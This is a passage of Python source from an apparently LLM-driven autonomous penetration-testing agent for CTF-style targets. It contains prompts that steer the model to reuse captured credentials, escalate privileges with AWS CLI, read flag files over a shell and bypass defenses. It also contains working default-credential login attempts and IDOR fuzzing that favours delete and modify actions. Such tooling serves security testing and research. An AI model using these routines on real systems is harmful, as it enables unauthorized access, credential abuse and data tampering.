                if _nt_tool == _pt_tool and _nt_endpoint == _pt_endpoint:
                    return True
            # Word overlap ratio check (fallback)
            _pt_inst = (pt.get("instruction") or "").lower()
            if _nt_inst and _pt_inst:
                _nt_words = set(_nt_inst.split())
                _pt_words = set(_pt_inst.split())
                if _nt_words and _pt_words:
                    _overlap = len(_nt_words & _pt_words) / min(len(_nt_words), len(_pt_words))
                    if _overlap > 0.75:
                        return True
        return False

    def _cap_pending_tasks(self, tasks: list[dict], max_total: int = 20,
                           max_new_this_cycle: int = 8) -> list[dict]:
        """Trim lowest-quality pending tasks when plan exceeds *max_total*.

        Quality heuristic (in priority order):
        1. Tasks WITH a tool sort before tasks without (higher quality)
        2. Tasks with fewer dependencies sort first
        3. After sorting, keep at most *max_total* total tasks; excess
           pending tasks are trimmed (done/failed are always preserved).

        Returns the (possibly trimmed) task list.
        """
        if len(tasks) <= max_total:
            return tasks

        _pending = [t for t in tasks if t.get("status") == "pending"]
        _non_pending = [t for t in tasks if t.get("status") != "pending"]
        _keep_pending = max(0, max_total - len(_non_pending))

        if len(_pending) <= _keep_pending:
            return tasks

        def _quality_key(t):
            deps = len(t.get("dependent_task_ids", []))
            has_tool = 1 if t.get("tool", "") else 0
            # -has_tool: tasks WITH tool (key=-1) sort BEFORE tasks without (key=0)
            return (deps, -has_tool)

        _pending.sort(key=_quality_key)
        _to_remove = set(t["id"] for t in _pending[_keep_pending:])
        trimmed = _pending[:_keep_pending]
        _removed_count = len(_to_remove)

        if _removed_count > 0:
            _removed_tools = [t.get("tool", "?") for t in _pending[_keep_pending:]]
            print(f"\n[PLAN-CAP] Trimmed {_removed_count} low-quality pending task(s): {_removed_tools}")

        return [t for t in tasks if t.get("id") not in _to_remove]

    async def _review_and_update_plan(
        self, task: dict, success: bool, task_result: str = ""
    ) -> None:
        """LLM reviews and updates the plan after every task (VulnBot-style).

        Called after each task completes, regardless of success or failure.
        The LLM sees what was learned and can add/remove/reorder tasks.
        """
        if not getattr(self, 'exploitation_plan', None):
            return

        # Mark task status with retry enforcement
        task["attempts"] = task.get("attempts", 0) + 1
        if success:
            task["status"] = "done"
        elif task["attempts"] >= self._task_attempt_limit:
            task["status"] = "exhausted"
            self._exhausted_task_ids.add(task["id"])
            log.warning("Task %s exhausted after %d attempts",
                        task.get("id"), task["attempts"])
        else:
            task["status"] = "failed"
        task["result_summary"] = task_result[:2000]

        # Build prompt: what just happened + current plan + new DKG state
        state = self._get_state()
        new_discoveries = ""
        if state.endpoints:
            new_discoveries += "\n".join(
                f"  - {ep.method} {ep.url}" + (f" params={ep.params}" if ep.params else "")
                for ep in state.endpoints[-5:]
            )
            new_discoveries = f"\n## Latest Discoveries\n{new_discoveries}"
        if state.credentials:
            cred_text = "\n".join(
                f"  - {c.username}@{c.source_host}" for c in state.credentials
            )
            new_discoveries += f"\n## Credentials\n{cred_text}"

        # If the task was reading a config/credential file, flag it explicitly
        cred_reminder = ""
        api_reminder = ""
        unexpected_data = ""
        _aws_fail_reminder = ""
        if success and task_result:
            task_result_lower = task_result.lower()
            if any(kw in task_result_lower for kw in
                   ("token:", "client-certificate-data", "bearer",
                    "password:", "apiVersion:", "server: https://",
                    "success:", "login ok", "auth ok", "connected")):
                cred_reminder = (
                    "\nIMPORTANT: The task output above CONTAINS WORKING CREDENTIALS. "
                    "You MUST update ALL pending tasks that connect to this service "
                    "to use the discovered credentials (username and password). "
                    "If any pending task still has placeholder/wrong credentials in "
                    "its params, CORRECT them now. "
                    "If the output shows 'server: https://HOST:PORT', use that "
                    "exact URL with the credentials from the same file. "
                    "Send authenticated requests with curl_get: "
                    'headers="Authorization: Bearer <token>", insecure=true.\n'
                )
                # AWS/cloud credential detection
                if any(kw in task_result_lower for kw in
                       ("accesskeyid", "secretaccesskey", "sessiontoken",
                        "aws_access_key", "iam/security-credentials",
                        "assumerole", "temporary credential")):
                    cred_reminder += (
                        "\nCLOUD CREDENTIALS FOUND: The output contains AWS IAM "
                        "credentials (AccessKeyId/SecretAccessKey/Token). IMMEDIATELY "
                        "add tasks to use these with aws_cli:\n"
                        "  - aws sts get-caller-identity\n"
                        "  - aws s3 ls (for data access)\n"
                        "  - aws iam list-roles (for privilege escalation)\n"
                        "For local cloud simulators, use "
                        "--endpoint-url http://localhost:PORT in payload_json.\n"
                    )
                # S3 / object storage detection
                if any(kw in task_result_lower for kw in
                       ("s3", "bucket", "object storage", "listobjects",
                        "getobject", ".s3.")):
                    cred_reminder += (
                        "\nS3 / OBJECT STORAGE DETECTED: Try accessing with aws_cli:\n"
                        "  - aws s3 ls --no-sign-request (unauthenticated)\n"
                        "  - aws s3 cp s3://bucket/flag.txt - --no-sign-request\n"
                        "For local S3 simulators, add "
                        "--endpoint-url http://localhost:PORT to payload_json.\n"
                    )
            # aws_cli failure on local endpoints: the LLM often retries
            # aws_cli indefinitely against local simulators that don't
            # fully implement the AWS API.  Signal to switch tools.
            _aws_fail_reminder = ""
            if (not success and task.get("tool") == "aws_cli"
                    and any(kw in task_result_lower for kw in
                            ("could not connect", "connection refused",
                             "not found", "internal server error",
                             "reached max retries"))):
                _aws_fail_reminder = (
                    "\nAWS CLI FAILURE: The aws_cli call failed against this "
                    "local endpoint.  Local cloud simulators often implement "
                    "only a subset of the full AWS API.  DO NOT retry aws_cli "
                    "with the same parameters — switch to curl_get or http_post "
                    "to access the endpoint via its REST API directly.  Try "
                    "GET on the root path, GET on known object keys, and POST "
                    "with JSON body.\n"
                )
            # Detect REST API / OpenAPI discovery
            if any(kw in task_result_lower for kw in
                   ("openapi", "swagger", "\"kind\"", "\"apiVersion\"",
                    "\"paths\"", "\"items\"", "\"metadata\"", "namespaces")):
                api_reminder = (
                    "\nIMPORTANT: The output above contains a REST API response or "
                    "OpenAPI spec. You MUST add tasks to explore these API paths: "
                    "list resources, access individual items by ID from the response, "
                    "check nested sub-resources. If there's an OpenAPI spec, read it "
                    "fully and use the documented paths. The flag is likely in a data "
                    "field returned by one of these API calls.\n"
                )
            # Detect structured data that doesn't match the tool used —
            # the service may have capabilities beyond current hypothesis
            _structured_indicators = (
                '"arn:', '"policy', '"permission', '"principal"',
                '"statement"', '"effect"', '"action"', '"resource"',
            )
            if any(kw in task_result_lower for kw in _structured_indicators):
                unexpected_data = (
                    "\nNOTE: The response contains structured permission/policy "
                    "data that doesn't match the tool you just called. The service "
                    "may have capabilities (access control, privilege management) "
                    "beyond its apparent purpose. Consider whether your initial "
                    "hypothesis about this application is correct — try tools and "
                    "operations that match the UNEXPECTED data you're seeing.\n"
                )

        _absent_text = ""
        if self._absent_services:
            _absent_text = (
                f"\n## Unreachable (do NOT probe again)\n"
                f"{', '.join(sorted(self._absent_services)[:8])}\n"
            )

        # Detect plan drift: when primary target has failed tasks, remind LLM
        # to fix them BEFORE exploring incidentally discovered HTTP ports.
        focus_reminder = ""
        plan = self.exploitation_plan
        if plan and plan.tasks:
            failed_primary = [
                t for t in plan.tasks
                if t.get("status") == "failed"
                and not any(kw in (t.get("instruction", "") or "").lower()
                           for kw in ("probe ", "whatweb", "identify ", "check if port"))
            ]
            pending_primary = [
                t for t in plan.tasks
                if t.get("status") == "pending"
                and not any(kw in (t.get("instruction", "") or "").lower()
                           for kw in ("probe ", "whatweb", "identify ", "check if port"))
            ]
            if failed_primary:
                failed_insts = [t.get("instruction", "")[:100] for t in failed_primary[:4]]
                focus_reminder = (
                    f"\nFOCUS: You have {len(failed_primary)} FAILED exploitation "
                    f"tasks that MUST be retried with corrected tools/params:\n"
                    + "\n".join(f"  - {inst}" for inst in failed_insts)
                    + f"\nThese are your PRIMARY target. RETRY them with the tool "
                    f"that previously succeeded for this target (check DONE tasks "
                    f"for working tool/param patterns). "
                    f"Do NOT add HTTP probe tasks for incidentally discovered "
                    f"ports until these primary exploitation tasks are DONE.\n"
                )
            elif pending_primary:
                focus_reminder = (
                    f"\nFOCUS: {len(pending_primary)} pending exploitation tasks "
                    f"for the PRIMARY target must be completed BEFORE adding tasks "
                    f"for incidentally discovered HTTP ports.\n"
                )

        # ── Post-exploitation flag hunt reminder ──
        # If ANY task gained shell/container/command execution, push the LLM
        # to search for flag files BEFORE doing anything else.
        _post_exploit_reminder = ""
        if plan and plan.tasks:
            _shell_tools = {"shell_exec", "ssh_exec", "ssh_key_exec", "docker_exec"}
            _has_shell = any(
                t.get("status") == "done" and t.get("tool", "") in _shell_tools
                for t in plan.tasks
            )
            # Also check if the current task output shows shell/container access
            if not _has_shell and task and task.get("tool", "") in _shell_tools and success:
                _has_shell = True

            if _has_shell:
                _done_flag_hunt = any(
                    t.get("status") == "done" and "flag" in (t.get("instruction", "") or "").lower()
                    and t.get("tool", "") in _shell_tools
                    for t in plan.tasks
                )
                if not _done_flag_hunt:
                    _post_exploit_reminder = (
                        f"\nFLAG HUNT (HIGHEST PRIORITY): You have shell/container access! "
                        f"IMMEDIATELY add tasks to search for flag files:\n"
                        f"  1. shell_exec: ls -la / && cat /flag* /root/flag* /tmp/flag* "
                        f"/home/*/flag* /app/flag* 2>/dev/null\n"
                        f"  2. shell_exec: find / -maxdepth 4 -name '*flag*' -type f 2>/dev/null\n"
                        f"  3. shell_exec: env | grep -i flag; cat /etc/hostname\n"
                        f"Flag files are the #1 CTF pattern. Do NOT enumerate databases or "
                        f"configure services before running these commands.\n"
                    )

        prompt = (
            f"Just completed: {task.get('instruction','')}\n"
            f"Tool: {task.get('tool','')}\n"
            f"Result: {success and 'SUCCESS' or 'FAILED'}\n"
            f"Output: {task_result[:4000]}\n"
            f"{cred_reminder}"
            f"{_aws_fail_reminder}"
            f"{api_reminder}"
            f"{unexpected_data}"
            f"{focus_reminder}"
            f"{_post_exploit_reminder}\n"
            f"{self._format_plan_status()}\n"
            f"{new_discoveries}"
            f"{_absent_text}\n\n"
            f"## Your Job: Update the Plan\n"
            f"Review the plan and apply relevant changes from:\n"
            f"- TOTAL tasks MUST NOT exceed 15. If the plan already has 12+ tasks, "
            f"you MUST REMOVE low-quality pending tasks before ADDING new ones\n"
            f"- **Target Consistency**: Only create tasks for services and ports that "
            f"were ACTUALLY discovered during reconnaissance (see Current State). "
            f"If you see credentials for a service whose port is NOT in the discovered "
            f"services list, do NOT create tasks for it — those credentials are from a "
            f"different target and are NOT relevant here.\n"
            f"- If credentials or tokens were obtained, ADD tasks that USE them immediately "
            f"(e.g., send authenticated requests to the relevant API endpoint)\n"
            f"- If a task discovered new endpoints/services, ADD exploration tasks for them\n"
            f"- If pending tasks target endpoints that returned errors, REMOVE or CHANGE them\n"
            f"- If a task partially succeeded (some calls worked, some failed), SPLIT it\n"
            f"- REMOVE duplicate tasks that test the same thing with slightly different params\n"
            f"- If 5+ enumeration tasks all returned empty/nothing, STOP adding more "
            f"enumeration tasks — switch to exploitation or credential testing instead\n"
            f"{'- This task FAILED — generate alternative approaches using different tools, parameters, or endpoints. Do NOT retry the same approach.' if not success else ''}\n"
            f"- If the plan has >40 tasks, aggressively CULL low-value/redundant pending "
            f"tasks. Prefer 10-20 high-quality exploitation tasks over 50+ probe tasks.\n\n"
            f"Output the COMPLETE updated task list as a JSON array. "
            f"Preserve done/failed tasks. Output ONLY valid JSON array."
        )

        try:
            self._maybe_compress()
            content, _ = self.llm.generate(
                prompt=prompt,
                system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
            )
            new_tasks = self._extract_json_array(content) or []
            if new_tasks and isinstance(new_tasks, list) and len(new_tasks) > 0:
                # Keep done/failed tasks, replace pending with LLM's updated list
                preserved = [t for t in self.exploitation_plan.tasks
                           if isinstance(t, dict)
                           and t.get("status") in ("done", "failed", "skipped", "exhausted", "pending")
                           and t.get("id") != task.get("id")]
                # Add the just-completed task with updated status
                preserved.append(task)
                # Merge in new tasks from LLM (avoid duplicate IDs)
                existing_ids = {t["id"] for t in preserved}
                # Collect LLM's dependency updates for existing tasks
                llm_dep_updates: dict[str, list] = {}
                _new_added_this_cycle = 0
                _MAX_NEW_PER_CYCLE = 8
                for nt in new_tasks:
                    if not isinstance(nt, dict):
                        continue
                    nt.setdefault("status", "pending")
                    nt.setdefault("dependent_task_ids", nt.pop("dependencies", []))
                    if nt["id"] not in existing_ids:
                        # Dedup using shared helper
                        if self._is_duplicate_task(nt, preserved):
                            continue
                        # Per-cycle new task limit: prevent LLM from
                        # explosive one-shot plan expansion.  The plan can
                        # still grow across multiple review cycles.
                        if _new_added_this_cycle >= _MAX_NEW_PER_CYCLE:
                            print(f"\n[PLAN-CAP] Review cycle new-task limit reached "
                                  f"({_MAX_NEW_PER_CYCLE}).  Additional tasks deferred.")
                            break
                        preserved.append(nt)
                        existing_ids.add(nt["id"])
                        _new_added_this_cycle += 1
                    else:
                        # LLM updated an existing task — capture its dependency changes,
                        # but only if the update doesn't block a previously-independent task.
                        if "dependent_task_ids" in nt:
                            pt = next((t for t in preserved if t.get("id") == nt["id"]), None)
                            if pt and pt.get("status") == "pending":
                                _orig_deps = pt.get("dependent_task_ids") or []
                                _new_deps = nt["dependent_task_ids"]
                                # Allow: (a) task was already independent, or
                                #        (b) new deps are a subset of original (trimming)
                                if not _orig_deps or set(_new_deps).issubset(set(_orig_deps)):
                                    llm_dep_updates[nt["id"]] = _new_deps
                                # Otherwise: ignore LLM's dependency change —
                                # retroactively adding blocking dependencies
                                # to independent tasks breaks plan execution.
                            else:
                                # Done/failed tasks can have their deps updated freely
                                llm_dep_updates[nt["id"]] = nt["dependent_task_ids"]
                # Apply LLM's dependency updates to preserved tasks
                for t in preserved:
                    tid = t.get("id", "")
                    if tid in llm_dep_updates:
                        t["dependent_task_ids"] = llm_dep_updates[tid]
                self.exploitation_plan.tasks = preserved

                # Smart cap: trim lowest-quality pending tasks when plan
                # inflates beyond 20.  Done/failed tasks are kept for history.
                # Priority: tasks WITH tools (exploit/probe) are kept before
                # tasks without tools (speculative recon).
                self.exploitation_plan.tasks = self._cap_pending_tasks(preserved, max_total=20)

                # ── Dependency resolution: rewrite stale references ──
                # LLM may reference task IDs that were renamed or removed.
                # Resolve broken dependencies by matching on instruction similarity.
                _valid_ids = {t.get("id", "") for t in self.exploitation_plan.tasks}
                _all_tasks = list(self.exploitation_plan.tasks)
                for _t in self.exploitation_plan.tasks:
                    _deps = _t.get("dependent_task_ids", [])
                    if not _deps:
                        continue
                    _resolved = []
                    for _dep_id in _deps:
                        if _dep_id in _valid_ids:
                            # Drop dependency on completed tasks — a DONE/FAILED/
                            # EXHAUSTED task cannot continue to block downstream tasks.
                            _dep_status = ""
                            for _ot in _all_tasks:
                                if _ot.get("id") == _dep_id:
                                    _dep_status = _ot.get("status", "")
                                    break
                            if _dep_status in ("done", "failed", "skipped", "exhausted"):
                                continue  # dependency satisfied, no longer blocking
                            _resolved.append(_dep_id)
                            continue
                        # Try to find a replacement by instruction keyword overlap
                        _dep_inst = ""
                        for _ot in _all_tasks:
                            if _ot.get("id") == _dep_id:
                                _dep_inst = (_ot.get("instruction") or "").lower()
                                break
                        _best, _best_score = None, 0.0
                        if _dep_inst:
                            _dep_words = set(_dep_inst.split())
                            for _ct in self.exploitation_plan.tasks:
                                if _ct.get("id") == _t.get("id"):
                                    continue
                                _ct_inst = (_ct.get("instruction") or "").lower()
                                _ct_words = set(_ct_inst.split())
                                if _dep_words and _ct_words:
                                    _score = len(_dep_words & _ct_words) / len(_dep_words)
                                    if _score > _best_score:
                                        _best_score = _score
                                        _best = _ct.get("id")
                        if _best and _best_score > 0.4:
                            _resolved.append(_best)
                        else:
                            log.warning("Task '%s' depends on unknown task '%s' — "
                                        "dependency removed", _t.get("id"), _dep_id)
                    _t["dependent_task_ids"] = _resolved

                # Sanitize: replace blacklisted tools in any LLM-generated tasks
                self._sanitize_plan_tools(self.exploitation_plan.tasks)

                # Cycle detection after plan mutation
                cycle = self._detect_cycle(self.exploitation_plan.tasks)
                if cycle:
                    log.warning("[PLAN REVIEW] cycle detected: %s — breaking",
                                " -> ".join(cycle))
                    self._break_cycle(self.exploitation_plan.tasks, cycle)

                self._sync_plan_to_dkg()
                log.info("[PLAN REVIEW] plan updated: %d tasks (%d done, %d failed, %d exhausted, %d pending)",
                         len(preserved),
                         sum(1 for t in preserved if t.get("status") == "done"),
                         sum(1 for t in preserved if t.get("status") in ("failed", "skipped")),
                         sum(1 for t in preserved if t.get("status") == "exhausted"),
                         sum(1 for t in preserved if t.get("status") == "pending"))

                # ── Phase log: plan review ──
                if self.phase_logger:
                    _review_text = (
                        f"Task '{task.get('id','')}' → {task.get('status','?')}\n"
                        f"Plan: {len(preserved)} tasks — "
                        f"{sum(1 for t in preserved if t.get('status') == 'done')} done, "
                        f"{sum(1 for t in preserved if t.get('status') in ('failed','skipped'))} failed, "
                        f"{sum(1 for t in preserved if t.get('status') == 'pending')} pending"
                    )
                    self.phase_logger.log_phase("plan_review", _review_text,
                        metadata={"task_id": task.get("id",""),
                                  "task_status": task.get("status",""),
                                  "total_tasks": len(preserved)})
        except Exception as e:
            log.warning("Plan review failed: %s — keeping current plan", e)
            self._sync_plan_to_dkg()

    async def _update_plan_after_task(self, task: dict, success: bool, result: Any = None):
        """Legacy: kept for sub-agent compatibility. Use _review_and_update_plan instead."""
        if not getattr(self, 'exploitation_plan', None):
            return
        task["attempts"] = task.get("attempts", 0) + 1
        if success:
            task["status"] = "done"
        elif task["attempts"] >= self._task_attempt_limit:
            task["status"] = "exhausted"
            self._exhausted_task_ids.add(task["id"])
        else:
            task["status"] = "failed"
        if result:
            task["result_summary"] = str(result)[:500]

    async def _replan_after_failure(self, failed_task: dict, result: Any = None):
        """LLM generates replacement tasks when a task fails."""
        tid = failed_task.get("id", "?")
        instr = failed_task.get("instruction", "")[:80]
        print(f"\n[REPLAN] Task '{tid}' failed: {instr}")
        print(f"  Generating alternative approaches...")

        prompt = f"""Task failed: {failed_task.get('instruction','')}
Tool: {failed_task.get('tool','')}
Params: {json.dumps(failed_task.get('params',{}))}
Result: {str(result)[:1000]}
Current plan: {self._format_plan_status()}

Generate replacement tasks as JSON array. Consider different tools, parameters, or endpoints.
If defense was detected, prioritize bypass-first approaches.
Output ONLY valid JSON array."""

        try:
            self._maybe_compress()
            content, _ = self.llm.generate(prompt=prompt)
            new_tasks = self._extract_json_array(content) or []
            if new_tasks:
                existing_ids = {t.get("id") for t in self.exploitation_plan.tasks if t.get("id") != failed_task.get("id")}
                self.exploitation_plan.tasks = [
                    t for t in self.exploitation_plan.tasks if t.get("id") != failed_task.get("id")
                ]
                # Dedup + per-failure cap: max 5 replacement tasks
                _MAX_REPLACE = 5
                _added = 0
                for nt in new_tasks:
                    if nt.get("id") not in existing_ids:
                        if _added >= _MAX_REPLACE:
                            print(f"[REPLAN] Replacement limit reached ({_MAX_REPLACE}). Skipping: {nt.get('id','?')}")
                            break
                        if self._is_duplicate_task(nt, self.exploitation_plan.tasks):
                            print(f"[REPLAN] Skipping duplicate: {nt.get('id','?')}")
                            continue
                        self.exploitation_plan.tasks.append(nt)
                        existing_ids.add(nt.get("id"))
                        _added += 1
                # Apply shared cap after adding replacements
                self.exploitation_plan.tasks = self._cap_pending_tasks(
                    self.exploitation_plan.tasks, max_total=20)
                # Sanitize: replace blacklisted tools in replanned tasks
                self._sanitize_plan_tools(self.exploitation_plan.tasks)
                print(f"[REPLAN] Added {len(new_tasks)} replacement task(s):")
                for nt in new_tasks[:5]:
                    print(f"  + {nt.get('id','?')}: {nt.get('instruction','')[:100]}")
                self._sync_plan_to_dkg()

                # ── Phase log: replan ──
                if self.phase_logger:
                    _replan_text = f"Replan for failed task '{tid}': "
                    _replan_text += f"added {len(new_tasks)} task(s)\n"
                    for _nt in new_tasks[:10]:
                        _replan_text += (
                            f"  + {_nt.get('id','?')}: "
                            f"{_nt.get('instruction','')[:120]}\n"
                        )
                    self.phase_logger.log_phase("replan", _replan_text,
                        metadata={"failed_task": tid,
                                  "new_tasks": len(new_tasks)})
        except Exception:
            failed_task["status"] = "skipped"

    def _sync_plan_to_dkg(self):
        """Sync in-memory plan state to DKG nodes."""
        plan = getattr(self, 'exploitation_plan', None)
        if not plan:
            return
        done = sum(1 for t in plan.tasks if t.get("status") == "done")
        failed = sum(1 for t in plan.tasks if t.get("status") in ("failed", "skipped", "exhausted"))
        self.dkg.add_node("Plan", plan.plan_id, {
            "plan_id": plan.plan_id, "phase": plan.phase, "goal": plan.goal,
            "total_tasks": len(plan.tasks), "completed": done, "failed": failed,
            "status": plan.status, "created_at": plan.created_at,
            "updated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        })

    def _generate_phase_summary(self, phase: str = "exploit") -> str:
        """Summarize completed phase for the next phase's planning context."""
        plan = getattr(self, 'exploitation_plan', None)
        if not plan or not plan.tasks:
            return ""
        completed = [t.get("instruction", "") for t in plan.tasks if t.get("status") == "done"]
        failed = [t.get("instruction", "") for t in plan.tasks if t.get("status") in ("failed", "skipped", "exhausted")]
        flags = [n.get("value", "") for n in self.dkg.query_nodes("Flag") if n.get("value", "").startswith("flag{")]
        summary_id = f"summary-{phase}-{plan.plan_id}"
        summary = {
            "summary_id": summary_id, "source_plan_id": plan.plan_id, "phase": phase,
            "completed_tasks": json.dumps(completed),
            "key_findings": json.dumps({"flags_found": flags, "endpoints": len(self.dkg.query_nodes("Endpoint"))}),
            "failed_approaches": json.dumps(failed),
            "created_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        }
        self.dkg.add_node("PlanSummary", summary_id, summary)
        self.dkg.add_edge(plan.plan_id, summary_id, "plan_successor")
        return json.dumps(summary)

    async def _fuzz_idor_patterns(self, base_url: str, patterns: dict[str, set[int]]) -> TaskResult | None:
        """Fuzz adjacent values for every discovered numeric ID pattern.

        Action patterns (archive, delete, modify) are tried first so
        indirect IDORs (archive-then-read) are exploitable.
        """
        all_ids: set[int] = set()
        for ids in patterns.values():
            all_ids.update(ids)

        # Generate candidate IDs: known IDs ±50, plus gap-filling between min and max
        if all_ids:
            min_id, max_id = min(all_ids), max(all_ids)
            # Fill gaps: if range is reasonable (< 500), try all IDs in between
            gap_range = list(range(min_id, max_id + 1)) if (max_id - min_id) < 500 else []
        else:
            gap_range = []
        offsets = list(range(-50, 51))
        base_norm = base_url.rstrip("/")

        # Sort: action patterns first (archive, delete, edit), then read patterns
        def _sort_key(item: tuple[str, set[int]]) -> int:
            p = item[0]
            if any(kw in p.lower() for kw in ("archive", "delete", "remove", "edit", "update", "modify")):
                return 0
            return 1

        sorted_patterns = sorted(patterns.items(), key=_sort_key)

        for pattern, known_ids in sorted_patterns:
            candidates: set[int] = set()
            for oid in all_ids:
                for off in offsets:
                    cid = oid + off
                    if cid > 0:
                        candidates.add(cid)
            for gid in gap_range:
                candidates.add(gid)

            for cid in sorted(candidates):
                if self._time_exceeded() or self._tokens_exceeded():
                    return None
                full_url = f"{base_norm}{pattern.replace('{}', str(cid))}"
                try:
                    resp = await self.client.get(full_url)
                except Exception:
                    continue
                flags = self.flag_pattern.findall(resp.body)
                if flags:
                    self._task_log_event("info", "flag_found_idor",
                        pattern=pattern, id=cid, url=full_url, flag=flags[0])
                    self.phase = OrchestratorPhase.DONE
                    return TaskResult(
                        success=True, flag=flags[0], steps=self.step_count,
                        tokens_used=self.llm.token_count,
                        time_elapsed=time.time() - self.start_time,
                    )
        return None

    async def _post_auth_explore(self, base_url: str) -> TaskResult | None:
        """Generic post-authentication exploration via crawl + IDOR fuzzing."""
        from collections import defaultdict

        log.info("_post_auth_explore starting on %s", base_url)

        visited: set[str] = set()
        to_visit: list[str] = []
        url_patterns: dict[str, set[int]] = defaultdict(set)
        base_norm = base_url.rstrip("/")

        # Seed from DKG endpoints
        for ep in self.dkg.query_nodes("Endpoint"):
            eu = ep.get("url", "")
            if eu and eu.startswith(base_norm):
                to_visit.append(eu)
        to_visit.insert(0, base_norm)

        MAX_DEPTH = 3
        MAX_PAGES = 50
        depth = 0

        while to_visit and depth < MAX_DEPTH and len(visited) < MAX_PAGES:
            batch = list(to_visit)
            to_visit.clear()

            for url in batch:
                if url in visited or len(visited) >= MAX_PAGES:
                    continue
                visited.add(url)

                if self._time_exceeded() or self._tokens_exceeded():
                    return None

                try:
                    resp = await self.client.get(url)
                except Exception:
                    continue

                # Check response for flag
                flags = self.flag_pattern.findall(resp.body)
                if flags:
                    self._task_log_event("info", "flag_found_crawl",
                        url=url, flag=flags[0])
                    self.phase = OrchestratorPhase.DONE
                    return TaskResult(
                        success=True, flag=flags[0], steps=self.step_count,
                        tokens_used=self.llm.token_count,
                        time_elapsed=time.time() - self.start_time,
                    )

                # Extract IDs from this URL
                self._extract_ids_from_url(url, url_patterns)
                self.step_count += 1

                # Parse HTML for links and embedded IDs
                ct = resp.headers.get("content-type", "")
                is_html = "text/html" in ct or "/html" in ct or not ct
                if is_html:
                    links = self._extract_links_from_html(resp.body, url)
                    for link in links:
                        if link not in visited and link.startswith(base_norm):
                            to_visit.append(link)
                    self._extract_ids_from_body(resp.body, base_norm, url_patterns)

            depth += 1

        log.info("_post_auth_explore crawl done: %d pages, %d ID patterns",
                 len(visited), len(url_patterns))

        # Phase 2: IDOR Fuzzing
        if url_patterns:
            result = await self._fuzz_idor_patterns(base_norm, url_patterns)
            if result:
                return result

        return None

    # ── Phase 3: Exploit (legacy — used by Coordinated/Distributed) ─

    async def _exploit_phase(self, target_url: str) -> TaskResult:
        """Attempt exploitation of identified vulnerabilities."""
        self.phase = OrchestratorPhase.EXPLOIT

        # ── Phase 3a: Default credential brute-forcing ────────────
        # Trigger whenever there are authenticated-looking endpoints or a login form
        ep_urls = [ep.get("url", "").lower() for ep in self.dkg.query_nodes("Endpoint")]
        has_login_form = any(
            kw in ep.get("url", "").lower()
            for ep in self.dkg.query_nodes("Endpoint")
            for kw in ("login", "signin", "auth", "token")
        ) or any(
            ep.get("params", "") in ("username", "user", "login", "email")
            for ep in self.dkg.query_nodes("Endpoint")
        )
        has_auth_endpoints = any(
            kw in u for u in ep_urls
            for kw in ("dashboard", "orders", "admin", "account", "profile",
                       "docs", "api", "users", "user", "ping", "token")
        )
        if has_login_form or has_auth_endpoints:
            for port in getattr(self, '_discovered_http_ports', []):
                host = getattr(self, "target_host", None) or "localhost"
                scheme = "https" if port == 443 else "http"
                base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
                for u, p in [("test", "test"), ("admin", "admin"), ("admin", "password"),
                              ("demo", "demo"), ("user", "user"), ("guest", "guest")]:
                    if self._time_exceeded():
                        break
                    try:
                        if await self.client.auto_login(base, u, p):
                            self._task_log_event("info", "auto_login_ok", url=base, username=u)
                            # Use form_extract to discover actual endpoints from the response
                            from darwin.tools.recon_server import create_recon_gateway
                            _rg = create_recon_gateway()
                            _fr = await _rg.call("form_extract", {"url": base})
                            if _fr.success and _fr.parsed_output:
                                for link in _fr.parsed_output.get("links", [])[:15]:
                                    if link and not link.startswith("#") and not link.startswith("javascript"):
                                        full = link if "://" in link else base.rstrip("/") + ("/" + link if not link.startswith("/") else link)
                                        self.dkg.add_node("Endpoint", f"explore-{link}", {
                                            "url": full, "method": "GET", "params": "",
                                            "auth_required": True,
                                        })
                            result = await self._post_auth_explore(base)
                            if result:
                                return result
                            break  # One successful login is enough
                    except Exception:
                        pass

        # Priority-sort vulnerabilities by confidence
        self.vulnerabilities.sort(key=lambda v: v.confidence, reverse=True)

        # LLM-driven exploitation
        result = await self._llm_driven_exploit(target_url)
        if result:
            return result

        # If all vulns exhausted without finding flag, try generic flag search
        flag_result = await self._check_response_for_flag(target_url)
        if flag_result:
            return flag_result

        self.phase = OrchestratorPhase.FAILED
        return TaskResult(
            success=False, steps=self.step_count,
            tokens_used=self.llm.token_count,
            time_elapsed=time.time() - self.start_time,
            phase_at_end=OrchestratorPhase.FAILED,
            error="All vulnerabilities exhausted, no flag found",
        )

    # ── LLM-Driven Exploitation ─────────────────────────────────────

    async def _llm_driven_exploit(
        self, target_url: str
    ) -> TaskResult | None:
        """LLM-driven exploitation: the LLM decides which tools to use.

        The LLM receives vulnerability hypotheses, DKG context, and available
        attack tools. It returns an exploitation plan as JSON. Each step is
        executed, results are fed back, and the LLM adapts based on outcomes.
        Uses SYSTEM_PROMPT_ORCHESTRATOR as the system prompt.
        """
        import re as _re_ex

        # Build vulnerability summary for LLM
        vuln_text = ""
        for i, v in enumerate(self.vulnerabilities[:10]):
            vuln_text += (f"{i+1}. {v.vuln_type} on {v.endpoint} "
                          f"(param: {v.param}, confidence: {v.confidence:.2f})\n"
                          f"   Evidence: {v.evidence[:200]}\n")

        # Build tool list
        tool_names = self.attack_gateway.get_tool_names()
        tool_desc = "\n".join(f"- {n}" for n in sorted(tool_names))

        prompt = f"""Target: {target_url}

## Discovered Vulnerabilities (from analyze phase)
{vuln_text}

## Available Attack Tools
{tool_desc}

## Your Task
You are an autonomous penetration testing agent. Plan exploitation to find the flag
(format: flag{{...}} or FLAG{{...}}).

For each vulnerability, decide which tool to use with what parameters.
Consider: SQL injection (sqlmap_test), XSS (xss_reflection_test),
CMDi (command_injection_test), custom payloads (send_payload),
and fuzzing (ffuf_fuzz).

Output a JSON array of exploitation steps:
[{{"tool": "tool_name", "params": {{"url": "...", "param": "..."}}, "reason": "..."}}]

Max 6 steps. Prioritize high-confidence vulnerabilities. Include different
payloads and encoding variants if initial attempts might be blocked.
Respond ONLY with the JSON array."""

        # Transition to exploit planning phase (preserve history, swap system prompt)
        self.llm.replace_system_prompt(SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED)
        vuln_count = len(self.vulnerabilities)
        if vuln_count > 0:
            transition_msg = (
                f"[PHASE TRANSITION] Planning exploitation of {vuln_count} identified vulnerabilities.\n"
                f"Previous reconnaissance and analysis context is preserved above.\n"
                f"Generate exploitation steps based on the vulnerabilities below."
            )
        else:
            transition_msg = (
